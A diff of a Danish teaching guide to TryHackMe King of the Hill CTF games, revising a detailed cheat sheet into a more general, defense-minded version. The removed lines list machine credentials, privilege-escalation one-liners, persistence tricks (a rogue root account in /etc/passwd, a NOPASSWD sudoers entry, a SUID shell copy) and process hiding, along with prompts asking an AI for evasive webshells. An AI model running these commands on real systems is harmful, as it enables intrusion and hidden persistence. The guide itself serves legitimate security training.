@@ -1,80 +1,119 @@
-# King of the Hill: Praktisk vejledning
+# King of the Hill (KoTH)
+**Praktisk vejledning · IT-sikkerhed · Zealand**
 
 ## Hvad er CTF og KoTH?
 
-En CTF (Capture the Flag) er en sikkerhedskonkurrence, hvor deltagerne finder skjulte flags, korte strenge der beviser en løst opgave. De tre klassiske formater: **Jeopardy** (isolerede opgaver inden for web, krypto, reversing og forensics), **Attack-Defence** (hvert hold forsvarer egen maskine og angriber de andres) og **King of the Hill**, hvor alle kæmper om den samme maskine. KoTH er bindeledet: hack maskinen først, skriv dig ind som konge, forsvær tronen resten af runden.
+**Capture the Flag (CTF)** er en konkurrence, hvor man løser sikkerhedsopgaver og finder skjulte *flags* som bevis. Opgaverne handler typisk om netværk, web, kryptografi, systemer og forensics.
 
-**Hvorfor det er smart:** Én runde komprimerer en hel penetrationstest til 60 minutter. Du træner enumeration under tidspres, exploitation, privilege escalation og hardening i samme session, og modstanderne tvinger dig til at tænke som angriber og forsvarer samtidig. Det er lovlig øvelse på realistiske tilstande uden retsforfølgning, kun et scoreboard, og mønstrene genbruges direkte i certificeringer som OSCP og i det daglige arbejde.
+**King of the Hill (KoTH)** er en særlig CTF-form: Alle angriber den samme maskine. Målet er at opnå administratorrettigheder (*root/SYSTEM*), blive konge og derefter forsvare sin position mod de andre deltagere.
 
-**KoTH ift. MITRE ATT&CK:** En runde er en levende ATT&CK-øvelse. Portscanning er Reconnaissance, brute force og leakede credentials er Credential Access (T1110, T1078), kommandoinjektion og webshells er Execution (T1059, T1505.003), sudo- og SUID-misbrug er Privilege Escalation (T1548), chattr-låse, mount-binds og skjulte brugere er Persistence og Defense Evasion (T1098, T1564), og patchingen er hardening i praksis. Træn KoTH, og du har gået hele kill chainen på egen hånd.
+På TryHackMe varer en runde 60 minutter. Man får point for at være konge (10 point pr. hele minut) og for at finde flags.
 
-**Hvordan bliver man bedre:** Maskintid slår teoritid. Spil de samme maskiner igen med nye vinkler, før noter pr. maskine over hvad der virkede, lær GTFOBins og LOLBAS udenad, og lær at læse linpeas-output i stedet for at kopiere det blindt. Målbilledet: fra "jeg fulgte en opskrift" til "jeg genkender mønstret og ved, hvad der skal patches".
+**Hvorfor KoTH?** Fordi du skal kombinere offensive og defensive færdigheder under tidspres. Du lærer at undersøge ukendte systemer, identificere sårbarheder, udnytte dem og efterfølgende lukke dem. Det minder om virkelige sikkerhedshændelser, blot komprimeret til en konkurrence.
 
-**Spillet:** Op til 10 hackere, én maskine, 60 minutter. Kom først til root, skriv dit TryHackMe-brugernavn i `king.txt`, hold titlen, saml flags undervejs. Point optjenes pr. minut som konge. Kronen ligger i `/root/king.txt` (Linux), `c:\king.txt` (H1: Medium) eller `c:\Users\Administrator\king-server\king.txt` (Offline).
+**MITRE ATT&CK:** KoTH giver praktiske eksempler på Discovery (T1046), Initial Access (fx T1190), Execution (T1059), Privilege Escalation (T1548) og Defense Evasion. Brug ATT&CK til at beskrive, hvad du gør, og hvilke spor handlingerne efterlader.
 
-## Maskinpuljen (november 2026)
+**Hvordan bliver man bedre?** Øv enumeration, Linux/Windows, shells, `sudo`, SUID, GTFOBins og grundlæggende scripting. Gentag maskiner, før korte noter, og forstå dine kommandoer. Hurtighed kommer af genkendelse, ikke af tilfældige forsøg.
 
-14 maskiner: 12 Linux, 2 Windows. Fireworks, Fortune og Hogwarts genererer porte og credentials tilfældigt ved hver reset: metoderne holder, de nøjagtige svar gør ikke.
+## 1. Sådan griber du konkurrencen an
 
-| Maskine | Indgang (foothold) | Vej til root |
-|---|---|---|
-| **Carnage** | Upload af `.png.php` med Content-Type `image/png` på :82; skjult `dice.php` på :80 (input skrives baglæns) | `sudo -l`: suid `find`, `vim.tiny`, `netkit-ftp` (GTFOBins). NB: `king.txt` er append-only: `echo navn >> /root/king.txt` |
-| **Fireworks** | Nyeste maskine, bygget i flere tilfældige varianter: fuld portscan og webopsøgning | `sudo nmap --interactive` og derefter `!sh` (GTFOBins) |
-| **Food** | `telnet <IP> 46969` med cæsar-rote creds `food:givemecookies`; POST til `:15065/api/cmd` eksekverer som bread | suid `vim.basic`: rediger `/etc/sudoers` eller `/etc/passwd`; `screen` 4.5.0-exploit |
-| **Fortune** | `curl <IP>:3333 | base64 -d > f.zip` og `fcrackzip -u -D -p rockyou.txt f.zip` giver ssh-creds; NFS-share uden root-squash | `sudo pico /etc/sudoers`; suid `find`, `nice`, `xargs` |
-| **H1: Easy** | :8000 CMS med `admin:admin`: rediger side med webshell; :8002 eksekverer leveret PHP (`code=system(...);`) | serv2: `echo /bin/sh > /tmp/systemctl && chmod +x /tmp/systemctl && sudo PATH=/tmp:$PATH /usr/bin/restartServer`; serv3: root-cron kører `backup.sh` hvert minut |
-| **H1: Hard** | XXE på `:80/api/user?xml` læser kilde og cookie, så RCE via `/shell`; :8888 API giver ssh-creds til :2222 | `su admin`, `sudo -i`, derefter docker.sock: container med `/` mountet, skriv egen nøgle til authorized_keys |
-| **H1: Medium** (Win) | `cme smb <IP> -u achilles -p rockyou.txt` (crackmapexec), derefter `psexec.py` giver SYSTEM | Forsvar: `attrib +r c:\king.txt` og batch-loop |
-| **Hackers** | hydra mod FTP/SSH (rcampbell, gcrawford) og web-backdoor `plague`: `hydra -l plague -P rockyou.txt -t 64 <IP> http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect"` | `sudo openssl enc -in <fil>` læser og skriver alt som root; `sudo pico`; python3.6 med setuid-capability |
-| **Hogwarts** | Tilfældige porte. SSH-porten viser et website: `/permissions` afslører upload (Content-Type `application/pdf`), webshell som www-data; zip på FTP via zip2john; SQLi giver hermoine | suid `/etc/room_of_requirement` (overflow med `\xbe\xba\xfe\xca`); suid `ip netns add foo; ip netns exec foo /bin/sh -p`; `sudo easy_install` (draco) |
-| **Offline** (Win) | WebDAV på :80 (cadaver) giver `scara:LeagueIsMyLove`; direkte: `psexec.py kingofthe.domain/svc_robotarmy:robots@<IP>` | mykull har SeBackup: ret ACL på Administrator-mappen. Kronen ligger i `king-server` |
-| **Panda** | Kommandoshell i skjult mappe på :80; WordPress `po:password1`: webshell i 404.php | `sudo /usr/bin/ftp`, derefter `!/bin/sh`; suid `find`. Ingen `chattr` på maskinen |
-| **Production** | FTP/SMB-share `/key` rummer ashus ssh-nøgle; backdoor på :9001 svarer på `yourmom!` | `sudo su skiddy`, derefter `sudo git -p help config` og `!/bin/sh`; suid `less`, `expand`, `git` |
-| **Shrek** | `/api/search.php` med `search=f` giver FTP-creds; upload med `GIF87a`-header; robots.txt rummer shreks ssh-nøgle | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`; suid `gdb`; docker-gruppen (puss) |
-| **Tyler** | SMB-share `alert.txt` narrator-creds; LibreNMS på :8080 med `admin:admin` (exploit 47044); `/betatest` kommandoinjektion: `submit=submit&user=;id` | suid `vim` (`:py import os; os.execl("/bin/sh","sh","-p")`); knæk `/var/backups/shadow.bak` med `hashcat -m 1800` |
+**Før start:** Hav Kali/AttackBox klar, kontrollér VPN, og åbn terminal, browser og noter. Brug kun den IP-adresse, som konkurrencen tildeler.
 
-## Fremgangsmåde
+| Tid | Aktivitet |
+|---|---|
+| 0-5 min | Find åbne porte og tjenester |
+| 5-15 min | Identificér og afprøv en indgang |
+| 15-25 min | Få shell og eskalér rettigheder |
+| 25-40 min | Bliv konge, luk sårbarheder |
+| 40-60 min | Forsvar positionen, find flags og alternative indgange |
 
-1. **Forberedelse før start.** rockyou.txt på plads, statisk busybox klar (erstatning for chattr, når nogen sletter binæret), linpeas og pspy64 parate, en cheat-sheet pr. maskine (tabellen ovenfor). Notér hver løsning: genbrug sparer minutter næste spil.
-2. **Enumeration (0-5 min).** `nmap -p- -sV --min-rate 2000 <IP>` eller rustscan. Hvorfor: maskinerne gemmer indgange på tilfældige høje porte (telnet 46969, netcat 3333). Derefter `gobuster dir -t 100`: skjulte mapper er standard-indgangen. Tjek altid `robots.txt` samt anonym FTP og SMB.
-3. **Foothold.** Tag den hurtigste kendte vej fra tabellen. Hvert minut du eksperimenterer, er point til en anden. Stabiliser med det samme: egen ssh-nøgle i `authorized_keys`, og log ind med `ssh -T` så din session ikke vises i `who`.
-4. **Kronen.** `echo NAVN > /root/king.txt` (Windows: `echo NAVN > c:\king.txt`). Tjek scoreboardet: filen læses af king-service på port 9999.
-5. **Forsvar, resten af spillet.**
-   - Lås filen: `chattr +i /root/king.txt` (Windows: `attrib +r`).
-   - Loop uden fil: `while true; do echo -n NAVN >| /root/king.txt; sleep 0.1; done &`. Skrevet i terminalen ses kun `sleep` under `ps`; en fil afslører hele opskriften.
-   - Patch indgangene: `chmod -s $(which find)` fjern suid-biten, `rm /etc/sudoers.d/*`, `passwd root`, og ret sårbare PHP-filer med input-validering i stedet for at dræbe servicen.
-   - Persistence, for rivalerne kommer og rydder: ssh-nøgle i `/root/.ssh/authorized_keys`; `cp /bin/sh /home/.s && chmod u+s /home/.s`; ekstra root-bruger: `echo 'u:$1$u$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' >> /etc/passwd`; `echo 'navn ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers`.
-6. **Flags.** De ligger spredt i hjemmemapper, `/var`, configs og databaser: `find / -name "*flag*" 2>/dev/null` og `grep -riE "flag\{|thm\{" / 2>/dev/null`. Ekstra point, lav prioritet indtil kronen sidder fast.
-7. **Rivaler.** `w` og `ps aux | grep pts` viser hvem der er på maskinen. `pkill -9 -t pts/N` rydder en session. `mount -o bind /tmp /proc/<PID>` skjuler din egen proces. Kører en modstander et king-loop, afslører pspy64 det.
+Det er en prioritering, ikke en tidsgrænse. Bliv konge tidligere, hvis du kan.
 
-## Regler
+## 2. Kommandoer du skal kende
 
-- Port 9999 er king-service: rør den ikke.
-- Slet eller flyt ikke flags. Sabotér ikke maskinen: `rm -rf /usr/bin/*` og lignende er bandlyst, maskinen skal holdes brugbar for alle.
-- Ingen autopwn-scripts i offentlige spil. Reset kun ved nedbrud, ikke fordi maskinen er patchet.
-- Shell-kills er tilladt, men spil som en gentleman: patch vejen i stedet for at spamme kill. Misbrug rapporteres til koth@tryhackme.com.
-- Rootkits er tilladte, men må ikke gøre maskinen ubrugelig. Før en modstander loader et: `sysctl -w kernel.modules_disabled=1`.
+**Enumeration: Find angrebsfladen**
 
-## Værktøjsskab
+| Kommando | Formål |
+|---|---|
+| `nmap -p- --open <IP>` | Find alle åbne TCP-porte |
+| `nmap -sV -sC -p <PORTE> <IP>` | Identificér tjenester, versioner og standardinformation |
+| `curl -i http://<IP>` | Undersøg HTTP-svar og headers |
+| `gobuster dir -u http://<IP> -w <WORDLIST>` | Find skjulte mapper og filer |
+| `smbclient -L //<IP> -N` | Undersøg tilgængelige SMB-shares |
+| `showmount -e <IP>` | Undersøg eksporterede NFS-shares |
 
-GTFOBins (sudo- og SUID-udnyttelse), ExploitDB (versionsspecifikke exploits), crackmapexec og psexec.py (Windows), zip2john, fcrackzip, hashcat og hydra (credentials), statisk busybox (når chattr er slettet: samme filstørrelse afslører skjulte kopier), reverse_ssh eller pwncat (stabile shells, virker også når ssh er lukket).
+**Efter adgang: Forstå dine rettigheder**
 
-## Hacking KoTH med AI (Mistral Vibe)
+| Kommando | Formål |
+|---|---|
+| `whoami; id; hostname` | Hvem er du, og hvor er du? |
+| `sudo -l` | Hvilke kommandoer må du køre med forhøjede rettigheder? |
+| `find / -perm -4000 -type f 2>/dev/null` | Find SUID-programmer |
+| `getcap -r / 2>/dev/null` | Find Linux capabilities |
+| `ss -tulpen` | Se lyttende tjenester |
+| `ps aux` | Undersøg processer |
 
-AI er en copilot, ikke en autopilot. TryHackMe bandlyser autopwn-scripts i offentlige spil, og AI, der vinder spillet for dig, er det samme i pænere tøj. Brugt rigtigt er Vibe en sparringspartner, der sparer minutter og lærer dig mønstrene:
+Et åbent portnummer er ikke i sig selv en sårbarhed. Et SUID-program er heller ikke automatisk en vej til root. Undersøg konfiguration, version og rettigheder.
 
-- **Før spillet:** bed om et cheat-sheet pr. maskine (som tabellen ovenfor), en gennemgang af GTFOBins-mønstre eller en øveplan. Lad AI'en forklare værktøjer og angrebsmønstre, du ikke kender endnu, så du møder maskinen med forståelse i stedet for gættearbejde.
-- **Under enumeration:** indsæt dit nmap- eller gobuster-output, og få de tre mest sandsynlige indgange med begrundelse. AI læser godt på tværs af porte og versionsnumre, der hvor du ser en mur af tekst.
-- **Under privesc:** indsæt `sudo -l` og output fra `find / -perm /4000`, og bed om den hurtigste vej til root med GTFOBins-kommandoer. Eller indsæt linpeas-output og få de vigtigste fund forklaret ét ad gangen.
-- **Payloads og patching:** få genereret reverse shells, PHP-webshells der består en Content-Type-kontrol (`image/png`), eller et patch-forslag til en sårbar PHP-fil, klart til copy-paste.
-- **Efter spillet:** replay er gratis læring. Indsæt dine noter, og stil spørgsmålet: hvad overså jeg, og hvad skulle være blevet patchet først?
+**Bliv konge:** Når du har root på en Linux-maskine, skriv dit TryHackMe-brugernavn i `/root/king.txt` og verificér resultatet. På Windows varierer placeringen. Kontrollér altid, om filen har særlige attributter, inden du ændrer den.
 
-Konkrete prompts der virker:
+**Forsvar:** Find den adgangsvej, du selv brugte. Ret sårbar konfiguration, fjern unødvendige privilegier og begræns adgangen uden at ødelægge legitime tjenester. Kontrollér, om andre angrebsveje stadig er åbne.
 
-1. "Her er mit nmap-output: [indsæt]. Hvilke tre indgange er mest sandsynlige på en KoTH-maskine, og hvorfor?"
-2. "`sudo -l` viser [X], og SUID-listen er [Y]. Giv den hurtigste vej til root med GTFOBins-kommandoer."
-3. "Forklar dette linpeas-fund, og giv kommandoen der udnytter det: [indsæt]."
-4. "Generér en PHP-kommandoshell, der består en Content-Type-kontrol af image/png."
-5. "Jeg er root på [maskine]. Giv en prioriteret forsvars- og persistenscheckliste."
+## 3. Den aktuelle maskinpool
 
-Holdningen er enkel: verificér alt. AI hallucinerer også exploits, og hvert minut brugt på en falsk kommando er et point til modstanderen. Små prompter, konkrete outputs, og behold forståelsen hos dig selv: pointen er, at du bliver bedre, ikke afhængig.
+TryHackMe har 14 maskiner: 12 Linux og 2 Windows. Tabellen viser kendte indgange og relevante undersøgelsesmetoder. Detaljer kan ændre sig, og nogle maskiner varierer mellem runder.
+
+| Maskine | Hvad skal du kigge efter? |
+|---|---|
+| **Carnage** | PHP-upload, skjulte endpoints, `sudo -l` og SUID-programmer |
+| **Fireworks** | Fuld portscanning; varierende tjenester og privilegier |
+| **Food** | Usædvanlige porte, Telnet, API-kommandoudførelse, SUID |
+| **Fortune** | Base64/ZIP, credentials, NFS og sudo-konfiguration |
+| **H1: Easy** | CMS, webbaseret kommandoudførelse, cron og PATH |
+| **H1: Hard** | XML/XXE, API, SSH, Docker og privilege escalation |
+| **H1: Medium** | Windows, SMB, credentials og administratorrettigheder |
+| **Hackers** | FTP/SSH, web-login, credentials og sudo |
+| **Hogwarts** | Varierende porte, upload, SQLi og SUID |
+| **Offline** | Windows, WebDAV, SMB og Windows-privilegier |
+| **Panda** | WordPress, skjulte webmapper, sudo og SUID |
+| **Production** | FTP/SMB, SSH-nøgler og usikre sudo-rettigheder |
+| **Shrek** | Web-API, FTP, SSH, sudo og Docker |
+| **Tyler** | SMB, LibreNMS, kommandoinjektion og SUID |
+
+**Tommelfingerregel:** Undersøg alle porte. Identificér tjenesterne. Vælg den mest lovende indgang. Få adgang. Undersøg rettigheder. Bliv konge. Luk indgangen. Find flags.
+
+Læs om privilege escalation på [GTFOBins](https://gtfobins.github.io/) (Linux) og [LOLBAS](https://lolbas-project.github.io/) (Windows). Brug [MITRE ATT&CK](https://attack.mitre.org/) til at forstå teknikkerne.
+
+## 4. Hacking KoTH med AI (Mistral Vibe)
+
+**Mistral Vibe kan fungere som din tekniske sparringspartner.** Den kan læse terminaloutput, foreslå undersøgelser, forklare exploits og hjælpe med fejlfinding. Du styrer processen og verificerer resultaterne.
+
+**Under konkurrencen:**
+
+1. **Enumeration:** Giv Vibe dit Nmap-output. Bed den prioritere tre mulige angrebsflader.
+2. **Foothold:** Beskriv en mistænkelig tjeneste eller webfunktion. Bed om forslag til sikker verifikation.
+3. **Privilege escalation:** Indsæt resultater fra `sudo -l`, SUID eller Windows-privilegier. Bed om forklaring af relevante GTFOBins-/LOLBAS-teknikker.
+4. **Defense:** Forklar den sårbarhed, du anvendte. Bed om en konkret rettelse, der bevarer tjenestens funktion.
+5. **Efter spillet:** Få Vibe til at analysere din fremgangsmåde, fejl og oversete muligheder.
+
+**Eksempelprompt til Vibe:**
+
+"Jeg deltager i en autoriseret TryHackMe KoTH-konkurrence. Her er mit Nmap-output: [indsæt]. Prioritér tre undersøgelser, forklar hvorfor de er relevante, og giv de næste manuelle kommandoer. Skeln mellem observationer og hypoteser. Angiv relevante MITRE ATT&CK-teknikker."
+
+Arbejd trinvis. Bed om én undersøgelse ad gangen, kør kommandoen, og giv AI'en resultatet. Brug ikke autopwn-agenter eller automatiske angrebs- og hardening-scripts i offentlige spil. De er ikke tilladt.
+
+AI kan foreslå kommandoer, som ikke virker, eller misforstå output. **Forstå, før du eksekverer.**
+
+## 5. Spilleregler og læring
+
+Hold maskinen brugbar. Du må ikke sabotere tjenester, angribe konkurrenterne, slette eller ændre flags, gennemføre DoS eller påvirke king-servicen på port 9999. Følg altid de aktuelle konkurrenceregler.
+
+Efter runden skal du kunne besvare tre spørgsmål:
+
+- Hvordan fik du adgang, og hvorfor virkede metoden?
+- Hvilke MITRE ATT&CK-teknikker anvendte eller observerede du?
+- Hvordan kunne angrebet være opdaget eller forhindret?
+
+**Målet er ikke kun at vinde. Målet er at forstå et angreb så godt, at du også kan forhindre det.**
+
+*Kilder: [TryHackMe KoTH](https://tryhackme.com/games/koth) · [KoTH-regler](https://help.tryhackme.com/en/articles/6498315-king-of-the-hill-overview) · [Maskinnoter](https://github.com/andracs/koth-vejledning) · [MITRE ATT&CK](https://attack.mitre.org/)*
